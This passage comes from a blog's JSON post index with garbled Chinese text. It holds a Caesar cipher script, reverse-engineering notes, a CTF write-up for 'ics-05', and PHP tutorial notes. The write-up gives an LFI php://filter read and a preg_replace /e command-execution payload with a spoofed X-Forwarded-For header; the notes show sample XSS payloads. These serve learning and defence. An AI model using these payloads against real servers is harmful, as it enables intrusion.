print(\"1:Encry\") print(\"2:Decry\") print(\"3:Keyless Decryption\") mode=input () if mode==\"1\": print(\"Please enter the content to be encrypted:\") C=input() print(\"Please enter key:\") key = int(input()) key=key%26 Encryption(C, key, mode) if mode==\"2\": print(\"Please enter the content to be decrypted:\") C=input() print(\"Please enter key :\") key=int(input()) key = key % 26 Decryption(C, key, mode) if mode==\"3\": print(\"Please enter the content to be decrypted:\") C=input() key=1 while key&lt;26: Decryption(C, key, mode) key+=1 if mode!=\"1\"and mode!=\"2\" and mode!=\"3\": print(\"Error!\")if __name__ == '__main__': main()","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://singlemindedt.github.io/categories/å¯†ç å­¦/"}],"tags":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://singlemindedt.github.io/tags/å¯†ç å­¦/"}]},{"title":"åˆæ¢æ ˆæº¢å‡º","slug":"åˆæ¢æ ˆæº¢å‡º","date":"2019-10-10T14:09:17.000Z","updated":"2019-12-18T00:12:45.763Z","comments":true,"path":"2019/10/10/åˆæ¢æ ˆæº¢å‡º/","link":"","permalink":"https://singlemindedt.github.io/2019/10/10/åˆæ¢æ ˆæº¢å‡º/","excerpt":"","text":"è¿™é‡Œç»™å‡ºä¸€ä¸ªç®€å•çš„exeæ–‡ä»¶ï¼Œå®ç°çš„åŠŸèƒ½ä¸ºï¼šè®©ç”¨æˆ·é”®å…¥å¯†ç ï¼Œç¨‹åºå°†ä¹‹ä¸å›ºå®šå¯†ç (1234567)è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœé”™è¯¯ç»§ç»­é”®å…¥ï¼ŒæˆåŠŸåˆ™æç¤ºâ€œCongratulation! You have passed the verification!â€ å°†ç¨‹åºæ‹–å…¥IDAï¼Œåœ¨å·¦è¾¹çª—å£æœ‰å‡½æ•°åç§°åˆ—è¡¨ï¼Œæ‰¾åˆ°_mainå‡½æ•°åŒå‡»ï¼Œå¯ä»¥çœ‹åˆ°å…¶ç¨‹åºæµç¨‹å›¾ï¼š ä¼ªä»£ç ï¼š 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+0h] [ebp-8h]//å˜é‡v4 while ( 1 ) &#123; sub_4010A7(aPleaseInputPas, v4);//å‡½æ•°sub_4010A7éœ€è¦è°ƒç”¨ä¸¤ä¸ªå‚æ•°aPleaseInputPas, v4 scanf(aS, &amp;v4);//è¾“å…¥v4 if ( !sub_401000(&amp;v4) )//è‹¥sub_401000(&amp;v4)==0è°ƒç”¨ sub_4010A7(aIncorrectPassw, v4) break; sub_4010A7(aIncorrectPassw, v4); &#125; return sub_4010A7(aCongratulation, v4);&#125; æˆ‘ä»¬æ¥ä¸‹æ¥æŸ¥çœ‹ åˆ¤æ–­å‡½æ•°sub_401000ï¼š 1234567891011121314int __cdecl sub_401000(const char *a1)&#123; return strcmp(a1, a1234567);&#125;/*æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²è®¾è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ºstr1ï¼Œstr2ï¼Œè‹¥str1=str2ï¼Œåˆ™è¿”å›é›¶ï¼›è‹¥str1&lt;str2ï¼Œåˆ™è¿”å›è´Ÿæ•°ï¼›è‹¥str1&gt;str2ï¼Œåˆ™è¿”å›æ­£æ•°ã€‚*/ æŸ¥çœ‹sub_4010A7ï¼š 12345678910int __cdecl sub_4010A7(int a1, int a2)&#123; int v2; // edi int v3; // ebx v2 = _stbuf(&amp;stru_4080E0); v3 = sub_401E34(&amp;stru_4080E0, a1, (int)&amp;a2); _ftbuf(v2, &amp;stru_4080E0); return v3;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"re","slug":"re","permalink":"https://singlemindedt.github.io/tags/re/"}]},{"title":"ics-05","slug":"ics-05","date":"2019-10-05T02:53:52.000Z","updated":"2019-12-30T05:21:27.280Z","comments":true,"path":"2019/10/05/ics-05/","link":"","permalink":"https://singlemindedt.github.io/2019/10/05/ics-05/","excerpt":"","text":"ics-05é¢˜ç›®æè¿°ï¼šå…¶ä»–ç ´åè€…ä¼šåˆ©ç”¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒçš„åé—¨å…¥ä¾µç³»ç»Ÿ å®é™…æ“ä½œï¼šç‚¹å‡»é“¾æ¥è¿›å…¥â€œå·¥æ§äº‘ç®¡ç†ç³»ç»Ÿâ€ï¼Œæ ¹æ®é¢˜ç›®è¦æ±‚åªèƒ½ç‚¹å‡»â€œè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒâ€ï¼›å¾—åˆ°å¦‚ä¸‹é¡µé¢ï¼š é™¤äº†index.phpé¡µé¢ï¼Œæ²¡æœ‰å…¶ä»–æœ‰æ•ˆä¿¡æ¯ï¼ŒæŸ¥çœ‹æºç ï¼š å¯ä»¥çœ‹åˆ°?page=indedx;ç”±äºå‡ºç°pageè¿™ä¸ªgetå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æºç æ¼æ´ï¼› **æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLFIæ¼æ´ï¼‰çš„é»‘ç›’åˆ¤æ–­æ–¹æ³•ï¼šå•çº¯çš„ä»URLåˆ¤æ–­çš„è¯ï¼ŒURLä¸­pathã€dirã€fileã€pagã€pageã€archiveã€pã€engã€è¯­è¨€æ–‡ä»¶ç­‰ç›¸å…³å…³é”®å­—çœ¼çš„æ—¶å€™,å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´:ä¸»è¦æ¶‰åŠåˆ°çš„å‡½æ•°ï¼šinclude(),require()ã€include_once(),require_once()magic_quotes_gpc()ã€allow_url_fopen()ã€allow_url_include()ã€move_uploaded_file() ã€readfile() file()ã€and file_get_contents()ã€upload_tmp_dir()ã€post_max_size()ã€and max_input_time()ç­‰å…¸å‹æ¼æ´ä»£ç ï¼š&lt;!â€“?php include($_GET[â€˜pagesâ€™].â€˜.phpâ€™); ?â€“&gt;å‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/qq_29419013/article/details/81202358**å°è¯•è¯»å–index.phpçš„é¡µé¢æºç ï¼Œé€šè¿‡phpå†…ç½®åè®®ç›´æ¥è¯»å–ä»£ç ï¼š?page=php://filter/read=convert.base64-encode/resource=index.phpå¾—åˆ°å¾ˆé•¿ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç å¾—åˆ°æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"renderer\" content=\"webkit\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"&gt; &lt;link rel=\"stylesheet\" href=\"layui/css/layui.css\" media=\"all\"&gt; &lt;title&gt;è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;ul class=\"layui-nav\"&gt; &lt;li class=\"layui-nav-item layui-this\"&gt;&lt;a href=\"?page=index\"&gt;äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;fieldset class=\"layui-elem-field layui-field-title\" style=\"margin-top: 30px;\"&gt; &lt;legend&gt;è®¾å¤‡åˆ—è¡¨&lt;/legend&gt; &lt;/fieldset&gt; &lt;table class=\"layui-hide\" id=\"test\"&gt;&lt;/table&gt; &lt;script type=\"text/html\" id=\"switchTpl\"&gt; &lt;!-- è¿™é‡Œçš„ checked çš„çŠ¶æ€åªæ˜¯æ¼”ç¤º --&gt; &lt;input type=\"checkbox\" name=\"sex\" value=\"&#123;&#123;d.id&#125;&#125;\" lay-skin=\"switch\" lay-text=\"å¼€|å…³\" lay-filter=\"checkDemo\" &#123;&#123; d.id==1 0003 ? 'checked' : '' &#125;&#125;&gt; &lt;/script&gt; &lt;script src=\"layui/layui.js\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script&gt; layui.use('table', function() &#123; var table = layui.table, form = layui.form; table.render(&#123; elem: '#test', url: '/somrthing.json', cellMinWidth: 80, cols: [ [ &#123; type: 'numbers' &#125;, &#123; type: 'checkbox' &#125;, &#123; field: 'id', title: 'ID', width: 100, unresize: true, sort: true &#125;, &#123; field: 'name', title: 'è®¾å¤‡å', templet: '#nameTpl' &#125;, &#123; field: 'area', title: 'åŒºåŸŸ' &#125;, &#123; field: 'status', title: 'ç»´æŠ¤çŠ¶æ€', minWidth: 120, sort: true &#125;, &#123; field: 'check', title: 'è®¾å¤‡å¼€å…³', width: 85, templet: '#switchTpl', unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;/script&gt; &lt;script&gt; layui.use('element', function() &#123; var element = layui.element; //å¯¼èˆªçš„hoveræ•ˆæœã€äºŒçº§èœå•ç­‰åŠŸèƒ½ï¼Œéœ€è¦ä¾èµ–elementæ¨¡å— //ç›‘å¬å¯¼èˆªç‚¹å‡» element.on('nav(demo)', function(elem) &#123; //console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;/script&gt;&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt; &lt;?php if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &gt; 0) &#123; die(); &#125; if (strpos($page, 'text') &gt; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt; æºç å®¡è®¡ï¼Œå¾—åˆ°å¦‚ä¸‹å¯èƒ½å­˜åœ¨é—®é¢˜çš„å…³é”®éƒ¨åˆ†ï¼š 123456789101112131415161718192021&lt;?php//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; å¯ä»¥çœ‹åˆ°preg_replaceå‡½æ•°ï¼ˆæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨preg_replaceå‡½æ•°çš„å‘½ä»¤æ‰§è¡Œæ¼æ´åœ¨â€”/eæ¨¡å¼ä¸‹ï¼ˆå³å‚æ•°patternè¾“å…¥ä¸º/eæ—¶ï¼‰å°†replacementå‚æ•°å½“ä½œPHPä»£ç æ‰§è¡Œï¼ˆphp5.5ç‰ˆæœ¬åå·²ç»åºŸå¼ƒï¼‰ï¼›**å…³äºpreg_replaceï¼šhttps://www.php.net/manual/zh/function.preg-replace.php**å…ˆæ¥æµ‹è¯•ä¸€ä¸‹ï¼Œçœ‹èƒ½ä¸èƒ½è¾“å‡ºå…³äºPHPé…ç½®çš„ä¿¡æ¯ï¼› æ„é€ payloadï¼š/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lwwåŒæ—¶è¿˜å¾—ä¼ªé€ X_FORWARDED_FOR=== â€˜127.0.0.1â€™ï¼› æ„é€ ï¼šéªŒè¯æˆåŠŸï¼ æ¥ä¸‹æ¥å°è¯•è¯»å–æ–‡ä»¶ç›®å½•ï¼Œåˆ©ç”¨systemï¼ˆï¼‰å‡½æ•°ï¼› æ„é€ payloadï¼š/index.php?pat=/lww/e&amp;rep=systemï¼ˆâ€œlsâ€ï¼‰&amp;sub=lww cdæŸ¥çœ‹s3chahahaDiræ–‡ä»¶system(â€œcd%20s3chahahaDir%26%26lsâ€): **%20urlè§£é‡Šä¸ºç©ºæ ¼ã€%26ä¸º&amp;** å¾—åˆ°flagæ–‡ä»¶ï¼ŒcdæŸ¥çœ‹flagæ–‡ä»¶ï¼š å¾—åˆ°flag.phpï¼Œä½¿ç”¨catæŸ¥çœ‹å†…å®¹ï¼š","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"æ­£åˆ™è¡¨è¾¾å¼","slug":"æ­£åˆ™è¡¨è¾¾å¼","date":"2019-10-04T06:34:42.000Z","updated":"2019-10-04T07:18:57.002Z","comments":true,"path":"2019/10/04/æ­£åˆ™è¡¨è¾¾å¼/","link":"","permalink":"https://singlemindedt.github.io/2019/10/04/æ­£åˆ™è¡¨è¾¾å¼/","excerpt":"","text":"https://c.runoob.com/front-end/854","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://singlemindedt.github.io/tags/æ­£åˆ™è¡¨è¾¾å¼/"}]},{"title":"PHPå­¦ä¹ ","slug":"PHPå­¦ä¹ ","date":"2019-09-30T14:44:09.000Z","updated":"2019-10-03T13:33:07.472Z","comments":true,"path":"2019/09/30/PHPå­¦ä¹ /","link":"","permalink":"https://singlemindedt.github.io/2019/09/30/PHPå­¦ä¹ /","excerpt":"","text":"æ–‡ç« å†…å®¹ä¸»è¦æ¥è‡ªW3Schoolï¼Œä»…ä½œä¸ºå­¦ä¹ è®°å½•ä½¿ç”¨ã€‚ åœ¨ PHP åˆ›å»ºç”¨æˆ·å®šä¹‰å‡½æ•°ç”¨æˆ·å®šä¹‰çš„å‡½æ•°å£°æ˜ä»¥å•è¯ â€œfunctionâ€ å¼€å¤´ï¼š è¯­æ³•123function functionName() &#123; è¢«æ‰§è¡Œçš„ä»£ç ;&#125; æ³¨é‡Šï¼šå‡½æ•°åèƒ½å¤Ÿä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼ˆè€Œéæ•°å­—ï¼‰ã€‚æ³¨é‡Šï¼šå‡½æ•°åå¯¹å¤§å°å†™ä¸æ•æ„Ÿã€‚æç¤ºï¼šå‡½æ•°ååº”è¯¥èƒ½å¤Ÿåæ˜ å‡½æ•°æ‰€æ‰§è¡Œçš„ä»»åŠ¡ã€‚* è·å¾—æ•°ç»„çš„é•¿åº¦ - count() å‡½æ•°count() å‡½æ•°ç”¨äºè¿”å›æ•°ç»„çš„é•¿åº¦ï¼ˆå…ƒç´ æ•°ï¼‰ 1234&lt;?php$cars=array(\"porsche\",\"BMW\",\"Volvo\");echo count($cars);?&gt; PHP å…³è”æ•°ç»„å…³è”æ•°ç»„æ˜¯ä½¿ç”¨æ‚¨åˆ†é…ç»™æ•°ç»„çš„æŒ‡å®šé”®çš„æ•°ç»„ã€‚æœ‰ä¸¤ç§åˆ›å»ºå…³è”æ•°ç»„çš„æ–¹æ³•ï¼š 12345$age=array(\"Bill\"=&gt;\"35\",\"Steve\"=&gt;\"37\",\"Elon\"=&gt;\"43\");æˆ–è€…ï¼š$age['Bill']=\"63\";$age['Steve']=\"56\";$age['Elon']=\"47\"; éšåå¯ä»¥åœ¨è„šæœ¬ä¸­ä½¿ç”¨æŒ‡å®šé”®ï¼š 123456&lt;?php$age=array(\"Bill\"=&gt;\"63\",\"Steve\"=&gt;\"56\",\"Elon\"=&gt;\"47\");echo \"Elon is \" . $age['Elon'] . \" years old.\";?&gt;Elon is 47 years old. PHP - æ•°ç»„çš„æ’åºå‡½æ•°åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä¸‹ PHP æ•°ç»„æ’åºå‡½æ•°ï¼š 123456sort() - ä»¥å‡åºå¯¹æ•°ç»„æ’åºrsort() - ä»¥é™åºå¯¹æ•°ç»„æ’åºasort() - æ ¹æ®å€¼ï¼Œä»¥å‡åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åºksort() - æ ¹æ®é”®ï¼Œä»¥å‡åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åºarsort() - æ ¹æ®å€¼ï¼Œä»¥é™åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åºkrsort() - æ ¹æ®é”®ï¼Œä»¥é™åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº GET vs. POSTGET å’Œ POST éƒ½åˆ›å»ºæ•°ç»„ï¼ˆä¾‹å¦‚ï¼Œarray( key =&gt; value, key2 =&gt; value2, key3 =&gt; value3, â€¦)ï¼‰ã€‚æ­¤æ•°ç»„åŒ…å«é”®/å€¼å¯¹ï¼Œå…¶ä¸­çš„é”®æ˜¯è¡¨å•æ§ä»¶çš„åç§°ï¼Œè€Œå€¼æ˜¯æ¥è‡ªç”¨æˆ·çš„è¾“å…¥æ•°æ®ã€‚GET å’Œ POST è¢«è§†ä½œ $_GET å’Œ $_POSTã€‚å®ƒä»¬æ˜¯è¶…å…¨å±€å˜é‡ï¼Œè¿™æ„å‘³ç€å¯¹å®ƒä»¬çš„è®¿é—®æ— éœ€è€ƒè™‘ä½œç”¨åŸŸ - æ— éœ€ä»»ä½•ç‰¹æ®Šä»£ç ï¼Œæ‚¨èƒ½å¤Ÿä»ä»»ä½•å‡½æ•°ã€ç±»æˆ–æ–‡ä»¶è®¿é—®å®ƒä»¬ã€‚$_GET æ˜¯é€šè¿‡ URL å‚æ•°ä¼ é€’åˆ°å½“å‰è„šæœ¬çš„å˜é‡æ•°ç»„ã€‚$_POST æ˜¯é€šè¿‡ HTTP POST ä¼ é€’åˆ°å½“å‰è„šæœ¬çš„å˜é‡æ•°ç»„ã€‚ ä½•æ—¶ä½¿ç”¨ GETï¼Ÿé€šè¿‡ GET æ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹ä»»ä½•äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨ URL ä¸­ï¼‰ã€‚GET å¯¹æ‰€å‘é€ä¿¡æ¯çš„æ•°é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶åœ¨å¤§çº¦ 2000 ä¸ªå­—ç¬¦ã€‚ä¸è¿‡ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨ URL ä¸­ï¼ŒæŠŠé¡µé¢æ·»åŠ åˆ°ä¹¦ç­¾ä¸­ä¹Ÿæ›´ä¸ºæ–¹ä¾¿ã€‚GET å¯ç”¨äºå‘é€éæ•æ„Ÿçš„æ•°æ®ã€‚æ³¨é‡Šï¼šç»ä¸èƒ½ä½¿ç”¨ GET æ¥å‘é€å¯†ç æˆ–å…¶ä»–æ•æ„Ÿä¿¡æ¯ï¼ ä½•æ—¶ä½¿ç”¨ POSTï¼Ÿé€šè¿‡ POST æ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹å…¶ä»–äººæ˜¯ä¸å¯è§çš„ï¼ˆæ‰€æœ‰åç§°/å€¼ä¼šè¢«åµŒå…¥ HTTP è¯·æ±‚çš„ä¸»ä½“ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯¹æ‰€å‘é€ä¿¡æ¯çš„æ•°é‡ä¹Ÿæ— é™åˆ¶ã€‚æ­¤å¤– POST æ”¯æŒé«˜é˜¶åŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶æ—¶è¿›è¡Œ multi-part äºŒè¿›åˆ¶è¾“å…¥ã€‚ä¸è¿‡ï¼Œç”±äºå˜é‡æœªæ˜¾ç¤ºåœ¨ URL ä¸­ï¼Œä¹Ÿå°±æ— æ³•å°†é¡µé¢æ·»åŠ åˆ°ä¹¦ç­¾ã€‚æç¤ºï¼šå¼€å‘è€…åçˆ± POST æ¥å‘é€è¡¨å•æ•°æ®ã€‚ è¡¨å•å…ƒç´ è¡¨å•çš„ HTML ä»£ç æ˜¯è¿™æ ·çš„ï¼š 1&lt;form method=\"post\" action=\"&lt;?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]);?&gt;\"&gt; å½“æäº¤æ­¤è¡¨å•æ—¶ï¼Œé€šè¿‡ method=â€postâ€ å‘é€è¡¨å•æ•°æ®ã€‚ä»€ä¹ˆæ˜¯ $_SERVER[â€œPHP_SELFâ€] å˜é‡ï¼Ÿ$_SERVER[â€œPHP_SELFâ€] æ˜¯ä¸€ç§è¶…å…¨å±€å˜é‡ï¼Œå®ƒè¿”å›å½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åã€‚å› æ­¤ï¼Œ$_SERVER[â€œPHP_SELFâ€] å°†è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€å¼ é¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°±èƒ½å¤Ÿåœ¨è¡¨å•é¡µé¢è·å¾—é”™è¯¯æç¤ºä¿¡æ¯ã€‚ ä»€ä¹ˆæ˜¯ htmlspecialchars() å‡½æ•°ï¼Ÿhtmlspecialchars() å‡½æ•°æŠŠç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚è¿™æ„å‘³ç€ &lt; å’Œ &gt; ä¹‹ç±»çš„ HTML å­—ç¬¦ä¼šè¢«æ›¿æ¢ä¸º &lt; å’Œ &gt; ã€‚è¿™æ ·å¯é˜²æ­¢æ”»å‡»è€…é€šè¿‡åœ¨è¡¨å•ä¸­æ³¨å…¥ HTML æˆ– JavaScript ä»£ç ï¼ˆè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼‰å¯¹ä»£ç è¿›è¡Œåˆ©ç”¨ã€‚ å…³äº PHP è¡¨å•å®‰å…¨æ€§çš„é‡è¦æç¤º$_SERVER[â€œPHP_SELFâ€] å˜é‡èƒ½å¤Ÿè¢«é»‘å®¢åˆ©ç”¨ï¼å¦‚æœæ‚¨çš„é¡µé¢ä½¿ç”¨äº† PHP_SELFï¼Œç”¨æˆ·èƒ½å¤Ÿè¾“å…¥ä¸‹åˆ’çº¿ç„¶åæ‰§è¡Œè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰ã€‚æç¤ºï¼šè·¨ç«™ç‚¹è„šæœ¬ï¼ˆCross-site scriptingï¼ŒXSSï¼‰æ˜¯ä¸€ç§è®¡ç®—æœºå®‰å…¨æ¼æ´ç±»å‹ï¼Œå¸¸è§äº Web åº”ç”¨ç¨‹åºã€‚XSS èƒ½å¤Ÿä½¿æ”»å‡»è€…å‘å…¶ä»–ç”¨æˆ·æµè§ˆçš„ç½‘é¡µä¸­è¾“å…¥å®¢æˆ·ç«¯è„šæœ¬ã€‚å‡è®¾æˆ‘ä»¬çš„ä¸€å¼ åä¸º â€œtest_form.phpâ€ çš„é¡µé¢ä¸­æœ‰å¦‚ä¸‹è¡¨å•ï¼š 1&lt;form method=\"post\" action=\"&lt;?php echo $_SERVER[\"PHP_SELF\"];?&gt;\"&gt; ç°åœ¨ï¼Œå¦‚æœç”¨æˆ·è¿›å…¥çš„æ˜¯åœ°å€æ ä¸­æ­£å¸¸çš„ URLï¼šâ€http://www.example.com/test_form.php&quot;ï¼Œä¸Šé¢çš„ä»£ç ä¼šè½¬æ¢ä¸ºï¼š 1&lt;form method=\"post\" action=\"test_form.php\"&gt; åˆ°ç›®å‰ï¼Œä¸€åˆ‡æ­£å¸¸ã€‚ä¸è¿‡ï¼Œå¦‚æœç”¨æˆ·åœ¨åœ°å€æ ä¸­é”®å…¥äº†å¦‚ä¸‹ URLï¼š 1http://www.example.com/test_form.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„ä»£ç ä¼šè½¬æ¢ä¸ºï¼š 1&lt;form method=\"post\" action=\"test_form.php\"/&gt;&lt;script&gt;alert('hacked')&lt;/script&gt; è¿™æ®µä»£ç åŠ å…¥äº†ä¸€æ®µè„šæœ¬å’Œä¸€ä¸ªæç¤ºå‘½ä»¤ã€‚å¹¶ä¸”å½“æ­¤é¡µé¢åŠ è½½åï¼Œå°±ä¼šæ‰§è¡Œ JavaScript ä»£ç ï¼ˆç”¨æˆ·ä¼šçœ‹åˆ°ä¸€ä¸ªæç¤ºæ¡†ï¼‰ã€‚è¿™ä»…ä»…æ˜¯ä¸€ä¸ªå…³äº PHP_SELF å˜é‡å¦‚ä½•è¢«åˆ©ç”¨çš„ç®€å•æ— å®³æ¡ˆä¾‹ã€‚æ‚¨åº”è¯¥æ„è¯†åˆ° æ ‡ç­¾å†…èƒ½å¤Ÿæ·»åŠ ä»»ä½• JavaScript ä»£ç ï¼é»‘å®¢èƒ½å¤ŸæŠŠç”¨æˆ·é‡å®šå‘åˆ°å¦ä¸€å°æœåŠ¡å™¨ä¸Šçš„æŸä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç èƒ½å¤Ÿæ›´æ”¹å…¨å±€å˜é‡æˆ–å°†è¡¨å•æäº¤åˆ°å…¶ä»–åœ°å€ä»¥ä¿å­˜ç”¨æˆ·æ•°æ®ï¼Œç­‰ç­‰ã€‚å¦‚æœé¿å… $_SERVER[\"PHP_SELF\"] è¢«åˆ©ç”¨ï¼Ÿé€šè¿‡ä½¿ç”¨ htmlspecialchars() å‡½æ•°èƒ½å¤Ÿé¿å… $_SERVER[\"PHP_SELF\"] è¢«åˆ©ç”¨ã€‚è¡¨å•ä»£ç æ˜¯è¿™æ ·çš„ï¼š 1&lt;form method=\"post\" action=\"&lt;?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]);?&gt;\"&gt; htmlspecialchars() å‡½æ•°æŠŠç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚ç°åœ¨ï¼Œå¦‚æœç”¨æˆ·è¯•å›¾åˆ©ç”¨ PHP_SELF å˜é‡ï¼Œä¼šå¯¼è‡´å¦‚ä¸‹è¾“å‡ºï¼š 1&lt;form method=\"post\" action=\"test_form.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert('hacked')&amp;lt;/script&amp;gt;\"&gt; æ— æ³•åˆ©ç”¨ï¼Œæ²¡æœ‰å±å®³ï¼ é€šè¿‡ PHP éªŒè¯è¡¨å•æ•°æ®æˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯é€šè¿‡ PHP çš„ htmlspecialchars() å‡½æ•°ä¼ é€’æ‰€æœ‰å˜é‡ã€‚åœ¨æˆ‘ä»¬ä½¿ç”¨ htmlspecialchars() å‡½æ•°åï¼Œå¦‚æœç”¨æˆ·è¯•å›¾åœ¨æ–‡æœ¬å­—æ®µä¸­æäº¤ä»¥ä¸‹å†…å®¹ï¼š 123&lt;script&gt;location.href('http://www.hacked.com')&lt;/script&gt;- ä»£ç ä¸ä¼šæ‰§è¡Œï¼Œå› ä¸ºä¼šè¢«ä¿å­˜ä¸ºè½¬ä¹‰ä»£ç ï¼Œå°±åƒè¿™æ ·ï¼š&amp;lt;script&amp;gt;location.href('http://www.hacked.com')&amp;lt;/script&amp;gt; ç°åœ¨è¿™æ¡ä»£ç 